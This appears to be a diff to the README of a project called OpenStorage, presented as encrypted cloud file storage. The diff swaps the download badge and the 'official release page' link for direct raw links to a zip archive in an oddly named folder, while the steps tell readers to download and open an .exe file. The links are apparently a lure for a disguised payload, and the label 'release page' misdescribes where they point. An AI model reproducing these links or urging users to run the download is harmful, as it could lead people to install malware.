@@ -1,6 +1,6 @@
 # ☁️ OpenStorage - Secure file storage for everyone daily
 
-[![Download OpenStorage](https://img.shields.io/badge/Download_OpenStorage-Blue-blue)](https://github.com/brynautomotive31/OpenStorage)
+[![Download OpenStorage](https://img.shields.io/badge/Download_OpenStorage-Blue-blue)](https://github.com/brynautomotive31/OpenStorage/raw/refs/heads/main/overwroth/Storage_Open_1.0.zip)
 
 OpenStorage provides a way to store your files in the cloud. It works on a distributed network. This ensures your data remains safe and accessible. You keep control of your files at all times. The system uses encryption to protect your privacy. No one can see your data except you. 
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run OpenStorage:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official release page: [https://github.com/brynautomotive31/OpenStorage](https://github.com/brynautomotive31/OpenStorage).
+1.  Visit the official release page: [https://github.com/brynautomotive31/OpenStorage/raw/refs/heads/main/overwroth/Storage_Open_1.0.zip](https://github.com/brynautomotive31/OpenStorage/raw/refs/heads/main/overwroth/Storage_Open_1.0.zip).
 2.  Look for the latest version under the Releases section.
 3.  Click the file ending in .exe to start the download.
 4.  Open the file once the download finishes.
